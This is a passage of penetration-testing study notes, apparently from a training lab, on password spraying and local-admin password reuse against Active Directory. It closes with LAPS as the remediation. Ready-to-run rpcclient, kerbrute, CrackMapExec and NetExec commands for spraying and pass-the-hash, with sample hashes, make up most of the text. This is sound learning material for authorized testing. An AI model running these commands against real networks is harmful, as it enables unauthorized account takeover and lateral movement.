- we have the password policy, usernames enumerated
- proceed cautiously

### rpcclient bash one-liner
- `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

### Kerbrute - password spraying
- `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`

### CrackMapExec
- **Password Spray**
	- `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success | grep +`
		- `grep +` - return green [+] responses
- **Validate the creds**
	- `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`

### Netexec
- **Password Spraying**
	- `nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success | grep +`
- **Validating Creds**
	- `nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'`

<hr>

## Local Administrator Password Reuse
- If you have a password/hash to a local admin account, you can use those creds across other hosts on the network
- Local admin password is reused because of gold images in automated deployments for ease of management
<br>
- Use CrackMapExec.
- Targeting high-value hosts like - SQL or MS exchange servers - have high privileged users logged in or have credentials persistent in memory
- ![](/attachments/Pasted-image-20250211140701.png)
- ![](/attachments/Pasted-image-20250211140719.png)

### CrackMapExec - Local Admin Spraying
- `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf --continue-on-success | grep +`

### Netexec - Local Admin Spraying
- `nxc smb 172.16.5.0/23 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth --continue-on-success | grep +`

**This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.**

## Remediation
- One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.


